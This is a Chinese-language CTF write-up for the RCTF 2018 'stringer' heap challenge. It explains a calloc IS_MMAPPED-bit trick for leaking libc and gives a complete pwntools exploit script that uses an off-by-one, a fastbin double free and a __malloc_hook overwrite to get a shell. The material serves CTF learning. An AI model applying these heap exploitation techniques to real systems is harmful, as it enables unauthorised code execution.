# RCTF stringer
## Author: Wenhuo
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2></font>老样子先贴一下我学习的**NBUSEC**队伍的wp[链接](https://github.com/sajjadium/ctf-writeups/blob/master/RCTF/2018/stringer/stringer_exploit.py)，诶刚起步只能多学习学习其他大佬的。</br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2></font>这题保护全开，给的libc可以改写GOT，所以覆写\__malloc_hook不用多说，程序逆向分析一下发现明显存在off-by-one漏洞和double-free漏洞，当然还有UAF。这题主要难在calloc的行为会阻止我们泄露地址，不过，道高一尺魔高一丈:)</br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2></font>通过观察[calloc](https://github.com/str8outtaheap/heapwn/blob/master/malloc/__libc_calloc.c)的源代码可以看到有这样一段：</br>

```C
 p = mem2chunk (mem);

  /* Two optional cases in which clearing not necessary */
  if (chunk_is_mmapped (p))
    {
      if (__builtin_expect (perturb_byte, 0))
        return memset (mem, 0, sz);

      return mem;
    }

  csz = chunksize (p);
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2></font>意思就是说如果堆块被设置了mmaped标志位的话，calloc就不会把他初始化为0，那么mmaped标志位在哪呢？我们来看一下堆块头（取自[sploitfun](https://sploitfun.wordpress.com/2015/06/09/off-by-one-vulnerability-heap-based/)）：</br>

>prev_size – If the previous chunk is free, this field contains the size of previous chunk.</br>
>Else if previous chunk is allocated, this field contains previous chunk’s user data.</br>
></br>
>size : This field contains the size of this allocated chunk. Last 3 bits of this field contains flag information.</br>
>	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PREV_INUSE (P) – This bit is set when previous chunk is allocated.</br>
>	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IS_MMAPPED (M) – This bit is set when chunk is mmap’d.</br>
>	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NON_MAIN_ARENA (N) – This bit is set when this chunk belongs to a thread arena.</br>
></br>
>fd – Points to next chunk in the same bin.</br>
>bk – Points to previous chunk in the same bin.


&nbsp;&nbsp;&nbsp;&nbsp;<font size=2></font>也就是堆块size中的第二个比特位，如果本来size是0x91,我们置了mmaped之后就是0x93(PREV_INUSE | IS_MMAPED)。然后就可以绕过置0，成功泄露地址了:)其他套路都差不多，所以直接放脚本了：</br>

Exploit脚本:
=======

```python
from pwn import *

DEBUG = 1

def add_string(size, content, is_attack=False):
    p.recvuntil('choice: ')
    p.sendline('1')
    p.recvuntil('please input string length: ')
    p.sendline(str(size))

    if not is_attack:
        p.recvuntil('please input the string content: ')
        p.send(content)
        p.recvuntil('your string: ')

def view_string(title):
    p.recvuntil('choice: ')
    p.sendline('2')
    p.recvuntil("don't even think about it")

def edit_string(index, offset):
    p.recvuntil('choice: ')
    p.sendline('3')
    p.recvuntil('please input the index: ')
    p.sendline(str(index))
    p.recvuntil('input the byte index: ')
    p.sendline(str(offset))

def delete_string(index):
    p.recvuntil('choice: ')
    p.sendline('4')
    p.recvuntil('please input the index: ')
    p.sendline(str(index))

def leak():

    add_string(24, 'a' * 24)        # 0 (32) fastbin_1
    add_string(128, 'b' * 128)      # 1 (144) smallbin_1
    add_string(24,  'c' * 24)       # 2 (32) fastbin_2

    delete_string(1)

    # its size changes from 0x91 to 0x93 (PREV_INUSE && IS_MMAPED)
    edit_string(0, 24)
    edit_string(0, 24)

    # smallbin_2 will be placed in smallbin_1's chunk
    add_string(128, 'd' * 7 + '\n') # 3 (144) smallbin_2

    # leak bk pointer of smallbin_1
    p.recvuntil('d' * 7 + '\n')
    return u64(p.recv(6) + '\x00\x00') - 0x3c4b78

def exploit(libc_base):

    # allocate two fastbins to launch the fastbin attack using double free
    add_string(96, 'e' * 96)        # 4 (112) fastbin_3
    add_string(96, 'f' * 96)        # 5 (112) fastbin_4

    delete_string(4)
    delete_string(5)
    delete_string(4)

    fake_chunk = libc_base + 0x3c4aed			# before __malloc_hook
    print 'Fake Chunk: {}'.format(hex(fake_chunk))
    add_string(96, p64(fake_chunk) + 'g' * 88)          # 6 (112) fastbin_5

    add_string(96, 'h' * 96)                            # 7 (112) fastbin_6

    add_string(96, 'i' * 96)                            # 8 (112) fastbin_7

    execve_addr = libc_base + 0xf02a4 			# oneshot address
    add_string(96, 'i' * 19 + p64(execve_addr) + '\n')  # 9 (112) fastbin_8

    add_string(1, '\n', True)

if __name__ == '__main__':
    if DEBUG == 1:
      p = process('./stringer')
    else:
      p = remote('stringer.2018.teamrois.cn',7272)

    libc_base = leak()
    print 'libc base: {}'.format(hex(libc_base))

    exploit(libc_base)

    p.interactive()

```
